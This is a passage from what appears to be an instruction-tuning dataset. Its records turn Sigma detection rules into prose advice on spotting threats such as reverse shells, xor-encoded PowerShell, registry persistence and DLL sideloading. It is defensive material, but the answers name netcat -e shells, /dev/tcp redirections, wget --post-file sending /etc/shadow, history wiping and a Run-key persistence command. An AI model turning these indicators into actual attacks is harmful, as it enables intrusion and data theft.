    "output": "In order to detect the presence of a potentially xor encoded PowerShell command, you should: Monitor for the execution of PowerShell processes on Windows systems by watching for processes with images ending in '\\powershell.exe' or '\\pwsh.exe', or those specifically labeled with the original file names 'PowerShell.EXE' or 'pwsh.dll'. Additionally, look for processes that have a description of 'Windows PowerShell' or are identified as part of 'PowerShell Core 6' product. Focus on PowerShell command lines that contain the 'bxor' operation, which is indicative of xor encoding. Also, be vigilant for command lines that involve iterations or string manipulations, such as use of 'ForEach', explicit 'for' loops (notated as 'for(' or 'for '), string join operations (('-join ', \"-join'\", '-join\"', '-join`'), the '::Join' method, or the use of '[char]' for character conversion. \n\nMonitoring should be comprehensive, covering all the aforementioned conditions to ensure no potentially malicious xor encoded command goes undetected. Keep in mind that there may be legitimate uses of these patterns and operations, leading to potential false positives. The level of threat for these activities is considered medium, implying that while not all uses are malicious, the specified activity warrants attention and investigation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "presence of a potentially xor encoded powershell command",
      "answer": "In order to detect the presence of a potentially xor encoded PowerShell command, you should: Monitor for the execution of PowerShell processes on Windows systems by watching for processes with images ending in '\\powershell.exe' or '\\pwsh.exe', or those specifically labeled with the original file names 'PowerShell.EXE' or 'pwsh.dll'. Additionally, look for processes that have a description of 'Windows PowerShell' or are identified as part of 'PowerShell Core 6' product. Focus on PowerShell command lines that contain the 'bxor' operation, which is indicative of xor encoding. Also, be vigilant for command lines that involve iterations or string manipulations, such as use of 'ForEach', explicit 'for' loops (notated as 'for(' or 'for '), string join operations (('-join ', \"-join'\", '-join\"', '-join`'), the '::Join' method, or the use of '[char]' for character conversion. \n\nMonitoring should be comprehensive, covering all the aforementioned conditions to ensure no potentially malicious xor encoded command goes undetected. Keep in mind that there may be legitimate uses of these patterns and operations, leading to potential false positives. The level of threat for these activities is considered medium, implying that while not all uses are malicious, the specified activity warrants attention and investigation."
    }
  },
  {
    "instruction": "How to detect: changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll",
    "context": "",
    "output": "In order to detect changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll, you should: Look for modifications within the Windows Registry specifically targeting the setting values. Monitor registry events categorized under the setting changes, particularly focusing on those with the EventType of SetValue. The attention should be on changes made to the TargetObject ending with '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'. You need to be vigilant for modifications detailed as either 'DWORD (0x00000000)' or 'DWORD (0x00000002)', which represent the action of disabling or disabling with exceptions, respectively. This analysis is predicated on observations in the Windows environment, specifically noting registry modification events. The tagging relevant to this activity encompasses tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by manipulating the registry to disable critical logging functions. Be aware that detections based on this method are categorized at a low level due to the potential unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll",
      "answer": "In order to detect changes to the \"ExtErrorInformation\" key in order to disable ETW logging for rpcrt4.dll, you should: Look for modifications within the Windows Registry specifically targeting the setting values. Monitor registry events categorized under the setting changes, particularly focusing on those with the EventType of SetValue. The attention should be on changes made to the TargetObject ending with '\\Microsoft\\Windows NT\\Rpc\\ExtErrorInformation'. You need to be vigilant for modifications detailed as either 'DWORD (0x00000000)' or 'DWORD (0x00000002)', which represent the action of disabling or disabling with exceptions, respectively. This analysis is predicated on observations in the Windows environment, specifically noting registry modification events. The tagging relevant to this activity encompasses tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by manipulating the registry to disable critical logging functions. Be aware that detections based on this method are categorized at a low level due to the potential unknown false positives."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of netcat with the \"-e\" flag followed by common shells. This could be a sign of a potential reverse shell setup.",
    "context": "",
    "output": "In order to detect execution of netcat with the \"-e\" flag followed by common shells, which could be a sign of a potential reverse shell setup, you should: Monitor the creation of processes on Linux systems for the execution of the `nc` or `ncat` commands, particularly looking for instances where their command lines contain the `-c` or `-e` flags. These flags are notable for their use in setting up reverse shells, where `-e` specifies a program to execute after connection, essentially granting shell access to the remote party. Additionally, watch for command lines that include the invocation of common shell programs like `ash`, `bash`, `sh`, and others, including their paths (such as `/bin/bash`). This comprehensive approach helps identify suspicious activity where netcat is potentially used to establish a reverse shell, providing unauthorized access to the system shell. This activity is associated with tactics like Execution and Persistence, indicating a high level of threat when such patterns are detected.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of netcat with the \"-e\" flag followed by common shells. This could be a sign of a potential reverse shell setup.",
      "answer": "In order to detect execution of netcat with the \"-e\" flag followed by common shells, which could be a sign of a potential reverse shell setup, you should: Monitor the creation of processes on Linux systems for the execution of the `nc` or `ncat` commands, particularly looking for instances where their command lines contain the `-c` or `-e` flags. These flags are notable for their use in setting up reverse shells, where `-e` specifies a program to execute after connection, essentially granting shell access to the remote party. Additionally, watch for command lines that include the invocation of common shell programs like `ash`, `bash`, `sh`, and others, including their paths (such as `/bin/bash`). This comprehensive approach helps identify suspicious activity where netcat is potentially used to establish a reverse shell, providing unauthorized access to the system shell. This activity is associated with tactics like Execution and Persistence, indicating a high level of threat when such patterns are detected."
    }
  },
  {
    "instruction": "Explain how should I detect the following: firewall is created, modified, or deleted.",
    "context": "",
    "output": "In order to identify when a firewall is created, modified, or deleted, you should focus on monitoring Azure activity logs for specific operations indicative of such actions. Specifically, you should look out for events where the operation name is either MICROSOFT.NETWORK/AZUREFIREWALLS/WRITE or MICROSOFT.NETWORK/AZUREFIREWALLS/DELETE. These events signify that a firewall within Azure has been written to (which could mean creation or modification) or deleted. It's important to consider that these operations may not always represent malicious behavior; they could be legitimate administrative actions. Verification steps should involve checking the user identity, user agent, and hostname to confirm whether these modifications should be happening within your environment. Any modifications or deletions made by unfamiliar users or in a manner that seems unusual should be thoroughly investigated. If you discover that certain legitimate activities are consistently flagged by these criteria, you can consider exempting them to reduce false positives. The sensitivity level for these kinds of alerts is considered medium, suggesting a balanced approach to monitoring and investigation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "firewall is created, modified, or deleted.",
      "answer": "In order to identify when a firewall is created, modified, or deleted, you should focus on monitoring Azure activity logs for specific operations indicative of such actions. Specifically, you should look out for events where the operation name is either MICROSOFT.NETWORK/AZUREFIREWALLS/WRITE or MICROSOFT.NETWORK/AZUREFIREWALLS/DELETE. These events signify that a firewall within Azure has been written to (which could mean creation or modification) or deleted. It's important to consider that these operations may not always represent malicious behavior; they could be legitimate administrative actions. Verification steps should involve checking the user identity, user agent, and hostname to confirm whether these modifications should be happening within your environment. Any modifications or deletions made by unfamiliar users or in a manner that seems unusual should be thoroughly investigated. If you discover that certain legitimate activities are consistently flagged by these criteria, you can consider exempting them to reduce false positives. The sensitivity level for these kinds of alerts is considered medium, suggesting a balanced approach to monitoring and investigation."
    }
  },
  {
    "instruction": "Please help me detect the following: Detect usage of the \"driverquery\" utility. Which can be used to perform reconnaissance on installed drivers",
    "context": "",
    "output": "Sure!\nIn order to detect usage of the \"driverquery\" utility, which can be used to perform reconnaissance on installed drivers, you should: Focus on monitoring process creation events within Windows operating systems. Look specifically for occurrences where the process image name ends with 'driverquery.exe' or the original file name is recognized as 'drvqry.exe'. Be aware that there can be legitimate uses of this utility by third-party tools for investigating installed drivers; thus, this may result in false positives. The importance of this detection is considered medium, but it might be adjusted to low if the utility is frequently used within your environment for non-malicious purposes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect usage of the \"driverquery\" utility. Which can be used to perform reconnaissance on installed drivers",
      "answer": "In order to detect usage of the \"driverquery\" utility, which can be used to perform reconnaissance on installed drivers, you should: Focus on monitoring process creation events within Windows operating systems. Look specifically for occurrences where the process image name ends with 'driverquery.exe' or the original file name is recognized as 'drvqry.exe'. Be aware that there can be legitimate uses of this utility by third-party tools for investigating installed drivers; thus, this may result in false positives. The importance of this detection is considered medium, but it might be adjusted to low if the utility is frequently used within your environment for non-malicious purposes."
    }
  },
  {
    "instruction": "How to detect: modification addition to the 'TypedPaths' key in the user or admin registry from a non standard application. Which might indicate persistence attempt",
    "context": "",
    "output": "In order to detect modification addition to the 'TypedPaths' key in the user or admin registry from a non-standard application, which might indicate a persistence attempt, you should: Monitor your Windows environment specifically for registry settings modifications. Focus on the registry set category, where the involved product is Windows. Keep an eye out for events where the type of action is SetValue, particularly those that affect the registry path '\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\\'. It's crucial to exclude modifications made by standard system processes, notably any changes originating from 'C:\\Windows\\explorer.exe' and 'C:\\Windows\\SysWOW64\\explorer.exe', as these are considered typical and not suspicious. The detection strategy emphasizes that any SetValue EventType targeting the specified registry path not originating from the listed system processes should be scrutinized. False positives are considered unlikely, indicating a high level of confidence in this detection method's specificity towards identifying genuine attempts at establishing persistence through registry manipulation. This approach is underpinned by a high severity level, denoting the critical nature of such detection in protecting against persistence mechanisms commonly used by adversaries.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "modification addition to the 'TypedPaths' key in the user or admin registry from a non standard application. Which might indicate persistence attempt",
      "answer": "In order to detect modification addition to the 'TypedPaths' key in the user or admin registry from a non-standard application, which might indicate a persistence attempt, you should: Monitor your Windows environment specifically for registry settings modifications. Focus on the registry set category, where the involved product is Windows. Keep an eye out for events where the type of action is SetValue, particularly those that affect the registry path '\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\\'. It's crucial to exclude modifications made by standard system processes, notably any changes originating from 'C:\\Windows\\explorer.exe' and 'C:\\Windows\\SysWOW64\\explorer.exe', as these are considered typical and not suspicious. The detection strategy emphasizes that any SetValue EventType targeting the specified registry path not originating from the listed system processes should be scrutinized. False positives are considered unlikely, indicating a high level of confidence in this detection method's specificity towards identifying genuine attempts at establishing persistence through registry manipulation. This approach is underpinned by a high severity level, denoting the critical nature of such detection in protecting against persistence mechanisms commonly used by adversaries."
    }
  },
  {
    "instruction": "Please help me detect the following: Silence downloader. These commands are hardcoded into the binary.",
    "context": "",
    "output": "Sure!\nIn order to Detect Silence downloader. These commands are hardcoded into the binary, you should: Focus on monitoring process creation logs from Windows systems. Specifically, be on the lookout for the execution of certain command-line utilities such as 'tasklist.exe', 'qwinsta.exe', 'ipconfig.exe', and 'hostname.exe' that end with these specific names. These utilities are commonly used for reconnaissance activities to gather information about the system and network environment. Additionally, pay special attention to command lines that contain redirection (indicated by '>>') towards a file that ends with 'temps.dat'. This specific pattern of behavior is indicative of attempts to silently capture and store output for later retrieval, which is not commonly observed in legitimate scenarios.\n\nMoreover, watch for command lines that include the specific registry modification command '/C REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WinNetworkSecurity\" /t REG_SZ /d'. This command is an attempt to achieve persistence on the system by adding a registry entry that ensures the malware starts every time the infected user logs into Windows. The detection hinges on the association of reconnaissance behaviors with attempts to establish persistence. This combination is highly indicative of malicious activity related to the Silence downloader malware, characterized by its methodical approach to probing the infected environment before securing its presence for long-term operations.\n\nBe aware that detection requires both reconnaissance actions and persistence attempts to occur in proximity. This method reduces the likelihood of false positives, which are, as of now, not well-defined for this detection scenario. Any match should be investigated with high priority due to the critical nature of the behaviors involved. Focus on the relevant fields such as 'ComputerName', 'User', 'Image', and 'CommandLine' during the investigation to contextualize and confirm the suspected malicious activity. This detection is aligned with MITRE ATT&CK tactics and techniques, particularly those relating to Discovery and Persistence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Silence downloader. These commands are hardcoded into the binary.",
      "answer": "In order to Detect Silence downloader. These commands are hardcoded into the binary, you should: Focus on monitoring process creation logs from Windows systems. Specifically, be on the lookout for the execution of certain command-line utilities such as 'tasklist.exe', 'qwinsta.exe', 'ipconfig.exe', and 'hostname.exe' that end with these specific names. These utilities are commonly used for reconnaissance activities to gather information about the system and network environment. Additionally, pay special attention to command lines that contain redirection (indicated by '>>') towards a file that ends with 'temps.dat'. This specific pattern of behavior is indicative of attempts to silently capture and store output for later retrieval, which is not commonly observed in legitimate scenarios.\n\nMoreover, watch for command lines that include the specific registry modification command '/C REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WinNetworkSecurity\" /t REG_SZ /d'. This command is an attempt to achieve persistence on the system by adding a registry entry that ensures the malware starts every time the infected user logs into Windows. The detection hinges on the association of reconnaissance behaviors with attempts to establish persistence. This combination is highly indicative of malicious activity related to the Silence downloader malware, characterized by its methodical approach to probing the infected environment before securing its presence for long-term operations.\n\nBe aware that detection requires both reconnaissance actions and persistence attempts to occur in proximity. This method reduces the likelihood of false positives, which are, as of now, not well-defined for this detection scenario. Any match should be investigated with high priority due to the critical nature of the behaviors involved. Focus on the relevant fields such as 'ComputerName', 'User', 'Image', and 'CommandLine' during the investigation to contextualize and confirm the suspected malicious activity. This detection is aligned with MITRE ATT&CK tactics and techniques, particularly those relating to Discovery and Persistence."
    }
  },
  {
    "instruction": "Explain how should I detect the following: powershell script installed as a Service",
    "context": "",
    "output": "In order to detect PowerShell script installed as a Service, you should: monitor the loading of drivers on Windows systems, specifically watching for instances where PowerShell ('powershell' or 'pwsh') is involved in the driver load process. This activity requires attention because it could indicate malicious use of PowerShell scripts, possibly for persistence mechanisms by installing them as a service. The significance of detecting this behavior is heightened due to the potential for false positives being unknown, elevating the importance of vigilant monitoring in this context.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "powershell script installed as a Service",
      "answer": "In order to detect PowerShell script installed as a Service, you should: monitor the loading of drivers on Windows systems, specifically watching for instances where PowerShell ('powershell' or 'pwsh') is involved in the driver load process. This activity requires attention because it could indicate malicious use of PowerShell scripts, possibly for persistence mechanisms by installing them as a service. The significance of detecting this behavior is heightened due to the potential for false positives being unknown, elevating the importance of vigilant monitoring in this context."
    }
  },
  {
    "instruction": "How to detect: attempts to post the file with the usage of wget utility.\nThe adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.\n",
    "context": "",
    "output": "In order to detect attempts to post the file with the usage of wget utility, you should: Monitor audit logs on Linux systems for instances of the `wget` utility being used with the command-line option `--post-file=`, indicating an attempt to send a file to a remote server. This activity is captured by the audit daemon (`auditd`) and involves the `EXECVE` call type, signifying the execution of a program. Specifically, look for cases where the `wget` command is followed by `--post-file=` as this could be an attempt by an adversary to exploit misconfigured sudo permissions to read sensitive files like `/etc/shadow` and pass them to remote locations. Be aware that there may be legitimate instances of this activity, such as legitimate file upload operations using `wget`. Therefore, it's important to investigate each case to distinguish between benign and malicious uses. This detection is associated with tactics and techniques such as credential access through file manipulation and permission bypass.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "attempts to post the file with the usage of wget utility.\nThe adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.\n",
      "answer": "In order to detect attempts to post the file with the usage of wget utility, you should: Monitor audit logs on Linux systems for instances of the `wget` utility being used with the command-line option `--post-file=`, indicating an attempt to send a file to a remote server. This activity is captured by the audit daemon (`auditd`) and involves the `EXECVE` call type, signifying the execution of a program. Specifically, look for cases where the `wget` command is followed by `--post-file=` as this could be an attempt by an adversary to exploit misconfigured sudo permissions to read sensitive files like `/etc/shadow` and pass them to remote locations. Be aware that there may be legitimate instances of this activity, such as legitimate file upload operations using `wget`. Therefore, it's important to investigate each case to distinguish between benign and malicious uses. This detection is associated with tactics and techniques such as credential access through file manipulation and permission bypass."
    }
  },
  {
    "instruction": "Explain how should I detect the following: A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint.",
    "context": "",
    "output": "In order to detect a new application in AppCompat, indicating an application executing for the first time on an endpoint, you should focus on Windows logs, particularly those related to registry settings. Specifically, you should monitor for events where a value is being set in the registry under the path '\\AppCompatFlags\\Compatibility Assistant\\Store\\'. These events, denoted as 'Setvalue' under the 'EventType', are critical for identifying when an application is executed for the first time on a system, as this path in the registry is associated with the Compatibility Assistant's efforts to ensure applications run correctly on the Windows operating system.\n\nIt's important to understand that this detection mechanism serves an informational purpose. It is designed to alert when new applications are launched on an endpoint, which could either signify normal behavior, such as legitimate installation of new software, or potentially malicious activities if an application was executed without the user's knowledge. Given this context, one should be mindful of possible false positives, which might emanate from typical activities such as the initial setup phase of a system or the legitimate introduction of new applications to the endpoint. As such, while this detection strategy is invaluable for maintaining situational awareness and endpoint security hygiene, it necessitates a nuanced approach to response\u2014considering the specifics of one's organizational context and the commonality of new software installations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint.",
      "answer": "In order to detect a new application in AppCompat, indicating an application executing for the first time on an endpoint, you should focus on Windows logs, particularly those related to registry settings. Specifically, you should monitor for events where a value is being set in the registry under the path '\\AppCompatFlags\\Compatibility Assistant\\Store\\'. These events, denoted as 'Setvalue' under the 'EventType', are critical for identifying when an application is executed for the first time on a system, as this path in the registry is associated with the Compatibility Assistant's efforts to ensure applications run correctly on the Windows operating system.\n\nIt's important to understand that this detection mechanism serves an informational purpose. It is designed to alert when new applications are launched on an endpoint, which could either signify normal behavior, such as legitimate installation of new software, or potentially malicious activities if an application was executed without the user's knowledge. Given this context, one should be mindful of possible false positives, which might emanate from typical activities such as the initial setup phase of a system or the legitimate introduction of new applications to the endpoint. As such, while this detection strategy is invaluable for maintaining situational awareness and endpoint security hygiene, it necessitates a nuanced approach to response\u2014considering the specifics of one's organizational context and the commonality of new software installations."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell, you should monitor Linux systems for occurrences of specific strings within their logs. These strings represent commands or pieces of code often used by attackers to gain unauthorized access or control over a system remotely. They typically involve initiating connections from the compromised system to the attacker's system using TCP or UDP protocols, thus creating a reverse shell.\n\nKey indicators include commands that initiate TCP or UDP connections (/inet/tcp/0/, /dev/tcp/, /dev/udp/), utilize netcat (nc) with execution flags such as '-e', or manipulate file descriptors and network sockets for bash and sh shells to redirect input and output, establishing a persistent backdoor. Look for commands that involve creating named pipes with mknod and using them with netcat, or sophisticated use of socket programming in various programming languages to open connections and execute remote commands.\n\nThe detection of commands involving the redirection of shells to network sockets (bash -i, sh -i, exec 5<>/dev/tcp/), execution of interactive shells over network connections with advanced features (socat exec), or the presentation of a shell interface over network protocols indicates potential reverse shell activity. Additionally, commands that explicitly attempt to clean up evidence (modifying HISTFILE to /dev/null) or involve listening on ports with netcat in verbose mode are strong indicators of malicious intent.\n\nSpecial attention should be given to code snippets that perform direct socket manipulation or use high-level programming constructs to create network connections for command execution. This includes, but is not limited to, using Python or Perl for socket creation and duplication, or leveraging PowerShell to encode and send commands over network streams.\n\nWhile these indicators are strong signs of an attempt to establish a reverse shell, it is important to consider that there could be false positives, particularly in environments where such techniques are used for legitimate purposes. The level of alert for these detections is categorized as high, given the potential for significant impact on security through unauthorized remote access.\n\nThe associated techniques and tactics include the MITRE ATT&CK framework's categories such as Execution, Persistence, Privilege Escalation, and Defense Evasion, given that attackers may use these methods not only to gain initial access but also to maintain persistence, escalate privileges, or evade detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell",
      "answer": "In order to detect suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell, you should monitor Linux systems for occurrences of specific strings within their logs. These strings represent commands or pieces of code often used by attackers to gain unauthorized access or control over a system remotely. They typically involve initiating connections from the compromised system to the attacker's system using TCP or UDP protocols, thus creating a reverse shell.\n\nKey indicators include commands that initiate TCP or UDP connections (/inet/tcp/0/, /dev/tcp/, /dev/udp/), utilize netcat (nc) with execution flags such as '-e', or manipulate file descriptors and network sockets for bash and sh shells to redirect input and output, establishing a persistent backdoor. Look for commands that involve creating named pipes with mknod and using them with netcat, or sophisticated use of socket programming in various programming languages to open connections and execute remote commands.\n\nThe detection of commands involving the redirection of shells to network sockets (bash -i, sh -i, exec 5<>/dev/tcp/), execution of interactive shells over network connections with advanced features (socat exec), or the presentation of a shell interface over network protocols indicates potential reverse shell activity. Additionally, commands that explicitly attempt to clean up evidence (modifying HISTFILE to /dev/null) or involve listening on ports with netcat in verbose mode are strong indicators of malicious intent.\n\nSpecial attention should be given to code snippets that perform direct socket manipulation or use high-level programming constructs to create network connections for command execution. This includes, but is not limited to, using Python or Perl for socket creation and duplication, or leveraging PowerShell to encode and send commands over network streams.\n\nWhile these indicators are strong signs of an attempt to establish a reverse shell, it is important to consider that there could be false positives, particularly in environments where such techniques are used for legitimate purposes. The level of alert for these detections is categorized as high, given the potential for significant impact on security through unauthorized remote access.\n\nThe associated techniques and tactics include the MITRE ATT&CK framework's categories such as Execution, Persistence, Privilege Escalation, and Defense Evasion, given that attackers may use these methods not only to gain initial access but also to maintain persistence, escalate privileges, or evade detection."
    }
  },
  {
    "instruction": "How can I detect: potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location",
    "context": "",
    "output": "In order to detect potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location, you should monitor Windows image load events for instances where the \"gup.exe\" process loads the \"libcurl.dll\". It is important to note that the legitimate process \"Notepad++\\updater\\GUP.exe\" loading \"libcurl.dll\" should not be considered suspicious and thus is excluded from this detection criterion. This detection focuses on identifying abnormal or potentially malicious activity involving the sideloading technique where \"gup.exe\" is found outside of its usual update process environment, specifically targeting DLL files with the name \"libcurl.dll\". Consequently, this activity is observed under suspicion of being an attack technique but does come with a caution regarding unknown false positives, indicating that not all detections might represent actual threats. The severity level of this rule is marked as medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location",
      "answer": "In order to detect potential DLL sideloading of \"libcurl.dll\" by the \"gup.exe\" process from an uncommon location, you should monitor Windows image load events for instances where the \"gup.exe\" process loads the \"libcurl.dll\". It is important to note that the legitimate process \"Notepad++\\updater\\GUP.exe\" loading \"libcurl.dll\" should not be considered suspicious and thus is excluded from this detection criterion. This detection focuses on identifying abnormal or potentially malicious activity involving the sideloading technique where \"gup.exe\" is found outside of its usual update process environment, specifically targeting DLL files with the name \"libcurl.dll\". Consequently, this activity is observed under suspicion of being an attack technique but does come with a caution regarding unknown false positives, indicating that not all detections might represent actual threats. The severity level of this rule is marked as medium."
    }
  },
  {
    "instruction": "How can I detect: SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
    "context": "",
    "output": "In order to detect SyncAppvPublishingServer process execution which is usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Monitor Windows PowerShell modules for any occurrences of the process 'SyncAppvPublishingServer.exe'. This monitoring is imperative as the execution of this specific process can indicate an attempt to circumvent built-in security constraints within PowerShell, a common tactic employed by attackers to execute malicious scripts or commands undetected. It's essential to note that while this behavior can be a significant security concern, instances of 'App-V clients' running this process may not necessarily indicate a malicious activity but rather a legitimate use, and should be considered as potential false positives. The security level for this activity is classified as medium, underscoring a need for vigilance without immediate alarm.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
      "answer": "In order to detect SyncAppvPublishingServer process execution which is usually utilized by adversaries to bypass PowerShell execution restrictions, you should: Monitor Windows PowerShell modules for any occurrences of the process 'SyncAppvPublishingServer.exe'. This monitoring is imperative as the execution of this specific process can indicate an attempt to circumvent built-in security constraints within PowerShell, a common tactic employed by attackers to execute malicious scripts or commands undetected. It's essential to note that while this behavior can be a significant security concern, instances of 'App-V clients' running this process may not necessarily indicate a malicious activity but rather a legitimate use, and should be considered as potential false positives. The security level for this activity is classified as medium, underscoring a need for vigilance without immediate alarm."
    }
  },
  {
    "instruction": "Please help me detect the following: potential access to svchost process memory such as that used by Invoke-Phantom to kill the winRM Windows event logging service.",
    "context": "",
    "output": "Sure!\nIn order to detect potential access to svchost process memory such as that used by Invoke-Phantom to kill the winRM Windows event logging service, you should: focus on monitoring process access within the Windows operating system. Specifically, look for any instance where a process attempts to access the memory of the svchost.exe file located in the \\WINDOWS\\System32 directory. This process should be flagged if it requests a high level of access rights, specifically '0x1F3FFF', indicating comprehensive access permissions that could be utilized for malicious purposes such as stopping or interfering with the winRM service. Additionally, if the call trace for this access attempt includes 'UNKNOWN', it further heightens the suspicion that this may be a surreptitious attempt to interfere with system processes.\n\nHowever, there's a condition to filter out legitimate software development activities that could exhibit similar characteristics, particularly those involving Microsoft Visual Studio's MSBuild.exe tool, which is a legitimate process that might also access various system processes as part of its build operations. If the suspected access originates from Microsoft Visual Studio\u2019s MSBuild directories and involves .NET components as indicated by having a call trace to 'Microsoft.Build.ni.dll' or 'System.ni.dll', this access can be considered a potential false positive and may not be indicative of malicious activity.\n\nThe rule does acknowledge that there might be unknown cases that could lead to false positives, highlighting the importance of context and additional investigation upon an alert. The level of threat is considered high, underlining the importance of swiftly identifying and addressing such access patterns to safeguard against potential disruptions or manipulations of critical Windows services like winRM.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential access to svchost process memory such as that used by Invoke-Phantom to kill the winRM Windows event logging service.",
      "answer": "In order to detect potential access to svchost process memory such as that used by Invoke-Phantom to kill the winRM Windows event logging service, you should: focus on monitoring process access within the Windows operating system. Specifically, look for any instance where a process attempts to access the memory of the svchost.exe file located in the \\WINDOWS\\System32 directory. This process should be flagged if it requests a high level of access rights, specifically '0x1F3FFF', indicating comprehensive access permissions that could be utilized for malicious purposes such as stopping or interfering with the winRM service. Additionally, if the call trace for this access attempt includes 'UNKNOWN', it further heightens the suspicion that this may be a surreptitious attempt to interfere with system processes.\n\nHowever, there's a condition to filter out legitimate software development activities that could exhibit similar characteristics, particularly those involving Microsoft Visual Studio's MSBuild.exe tool, which is a legitimate process that might also access various system processes as part of its build operations. If the suspected access originates from Microsoft Visual Studio\u2019s MSBuild directories and involves .NET components as indicated by having a call trace to 'Microsoft.Build.ni.dll' or 'System.ni.dll', this access can be considered a potential false positive and may not be indicative of malicious activity.\n\nThe rule does acknowledge that there might be unknown cases that could lead to false positives, highlighting the importance of context and additional investigation upon an alert. The level of threat is considered high, underlining the importance of swiftly identifying and addressing such access patterns to safeguard against potential disruptions or manipulations of critical Windows services like winRM."
    }
  },
  {
    "instruction": "Can you explain how to detect: Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect adversaries enumerating software to identify security measures or vulnerable software versions, you should monitor PowerShell script activities on Windows systems, ensuring that Script Block Logging is enabled. Specifically, look for scripts that include commands to retrieve properties of installed software (using 'get-itemProperty'), filter these properties by specifying the software registry path ('\\software\\'), select specific object properties ('select-object'), and format the output in a table ('format-table'). It is important to be aware that such scripting activity might also be part of legitimate administrative tasks, so consider potential false positives. The activity of enumerating software aligns with the tactics and techniques related to discovery and collection, which may serve as preliminary steps for adversaries aiming to exploit identified vulnerabilities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.",
      "answer": "In order to detect adversaries enumerating software to identify security measures or vulnerable software versions, you should monitor PowerShell script activities on Windows systems, ensuring that Script Block Logging is enabled. Specifically, look for scripts that include commands to retrieve properties of installed software (using 'get-itemProperty'), filter these properties by specifying the software registry path ('\\software\\'), select specific object properties ('select-object'), and format the output in a table ('format-table'). It is important to be aware that such scripting activity might also be part of legitimate administrative tasks, so consider potential false positives. The activity of enumerating software aligns with the tactics and techniques related to discovery and collection, which may serve as preliminary steps for adversaries aiming to exploit identified vulnerabilities."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious network connections made by a well-known Windows binary run with no command line parameters",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious network connections made by a well-known Windows binary run with no command line parameters, you should monitor network connections from Windows systems for specific conditions. These include tracking connections initiated by the system where the process launching the connection ends with `\\regsvr32.exe`, `\\rundll32.exe`, or `\\dllhost.exe`. These executable files are legitimate Windows binaries but can be used maliciously to establish network connections.\n\nCriteria for detection include ensuring that the connection has been initiated (marked as 'true') and that the image or command line of the process initiating the connection ends with one of the mentioned executables. However, connections where these executables are run without any command line parameters should also be scrutinized. This is highlighted by filtering out instances where the command line parameter is either empty or null, suggesting that the executable was possibly invoked without any arguments, which is a common tactic used by attackers to avoid detection.\n\nGiven the high level of suspicion when these conditions are met, it is recommended to set the detection level to high due to the potential misuse of these Windows binaries in the facilitation of unauthorized network connections. Although some activities might be benign, leading to unknown false positives, the tags associated with this detection include tactics and techniques such as Execution, Persistence, Privilege Escalation, Defense Evasion, and potentially others directly related to the misuse of system utilities or binaries to achieve malicious objectives. \n\nThis method of detection is critical in identifying and mitigating threats that leverage legitimate system files for malicious network activities, thus enhancing the overall security posture against a variety of attack vectors.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
